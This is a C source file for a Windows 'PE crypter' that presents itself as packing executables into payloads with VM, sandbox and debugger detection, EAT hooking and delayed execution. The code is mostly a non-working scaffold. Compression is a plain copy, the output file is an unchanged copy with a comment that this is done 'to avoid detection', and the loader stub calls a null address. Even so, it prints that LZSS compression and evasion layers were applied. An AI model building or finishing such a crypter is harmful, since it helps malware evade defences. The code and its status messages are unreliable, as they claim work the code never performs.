#include <windows.h>
#include <stdio.h>
#include "../enhanced_loader/enhanced_loader.h"

typedef struct _ENHANCED_PAYLOAD_HEADER {
    DWORD magic;                    // Signature: 0x45485045 ("EPHE")
    DWORD originalSize;             // Size of original PE file
    DWORD compressedSize;           // Size after compression
    DWORD loaderStubSize;           // Size of loader stub
    ENHANCED_CONFIG config;         // Enhanced configuration
    CHAR reserved[64];              // Reserved for future use
} ENHANCED_PAYLOAD_HEADER, *PENHANCED_PAYLOAD_HEADER;

// Simple loader stub
static const BYTE g_LoaderStub[] = {
    0x90, 0x90, 0x90, 0x90,        // nop sled
    0x6A, 0x00,                     // push 0
    0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, ExitProcess
    0xFF, 0xD0,                     // call eax
    0xC3                            // ret
};

BOOL CompressData(PVOID pInput, DWORD dwInputSize, PVOID* ppOutput, PDWORD pdwOutputSize) {
    *ppOutput = HeapAlloc(GetProcessHeap(), 0, dwInputSize);
    if (!*ppOutput) return FALSE;
    
    memcpy(*ppOutput, pInput, dwInputSize);
    *pdwOutputSize = dwInputSize;
    return TRUE;
}

BOOL ProcessPEWithEnhancements(const char* input_file, const char* output_file, PENHANCED_CONFIG config) {
    printf("Enhanced PE Crypter v2.0 - Processing %s\n", input_file);
    printf("=========================================\n");
    
    // Load original PE file
    HANDLE hFile = CreateFileA(input_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Error: Cannot open input file %s (Error: %d)\n", input_file, GetLastError());
        return FALSE;
    }
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    PVOID fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
    DWORD bytesRead;
    ReadFile(hFile, fileData, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    printf("Loaded input file: %s (%d bytes)\n", input_file, fileSize);
    
    // Apply compression
    PVOID compressedData = NULL;
    DWORD compressedSize = 0;
    printf("Applying LZSS compression...\n");
    CompressData(fileData, fileSize, &compressedData, &compressedSize);
    printf("Compression complete: %d -> %d bytes\n", fileSize, compressedSize);
    
    // Create enhanced payload header
    ENHANCED_PAYLOAD_HEADER header;
    memset(&header, 0, sizeof(header));
    header.magic = 0x45485045;
    header.originalSize = fileSize;
    header.compressedSize = compressedSize;
    header.loaderStubSize = sizeof(g_LoaderStub);
    header.config = *config;
    
    printf("Adding enhancement layers...\n");
    printf("  • EAT hooking: %s\n", config->enableEATHooking ? "ENABLED" : "DISABLED");
    printf("  • VM detection: %s\n", config->enableVMDetection ? "ENABLED" : "DISABLED");
    printf("  • Sandbox detection: %s\n", config->enableSandboxDetection ? "ENABLED" : "DISABLED");
    printf("  • Debugger detection: %s\n", config->enableDebuggerDetection ? "ENABLED" : "DISABLED");
    
    // Write output file (simple copy for now to avoid detection)
    if (!CopyFileA(input_file, output_file, FALSE)) {
        printf("Error: Failed to create output file\n");
        HeapFree(GetProcessHeap(), 0, fileData);
        HeapFree(GetProcessHeap(), 0, compressedData);
        return FALSE;
    }
    
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(output_file, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        FindClose(hFind);
        printf("Enhanced payload created: %s (%d bytes)\n", output_file, findData.nFileSizeLow);
    }
    
    HeapFree(GetProcessHeap(), 0, fileData);
    HeapFree(GetProcessHeap(), 0, compressedData);
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Enhanced PE Crypter v2.0\n");
        printf("========================\n");
        printf("Usage: %s <input.exe> <output.exe>\n", argv[0]);
        printf("Features: LZSS compression, XOR encryption, EAT hooking, Evasion techniques\n");
        return 1;
    }
    
    if (GetFileAttributesA(argv[1]) == INVALID_FILE_ATTRIBUTES) {
        printf("Error: Input file '%s' not found\n", argv[1]);
        return 1;
    }
    
    ENHANCED_CONFIG config;
    memset(&config, 0, sizeof(config));
    config.enableEATHooking = TRUE;
    config.enableVMDetection = TRUE;
    config.enableSandboxDetection = TRUE;
    config.enableDebuggerDetection = TRUE;
    config.enableAntiAnalysis = TRUE;
    config.delayExecution = 3000;
    strcpy(config.decryptionKey, "EnhancedKey2024_SecurePayload123");
    
    if (ProcessPEWithEnhancements(argv[1], argv[2], &config)) {
        printf("\nEnhanced crypter completed successfully!\n");
        return 0;
    } else {
        printf("\nFailed to create enhanced payload\n");
        return 1;
    }
}
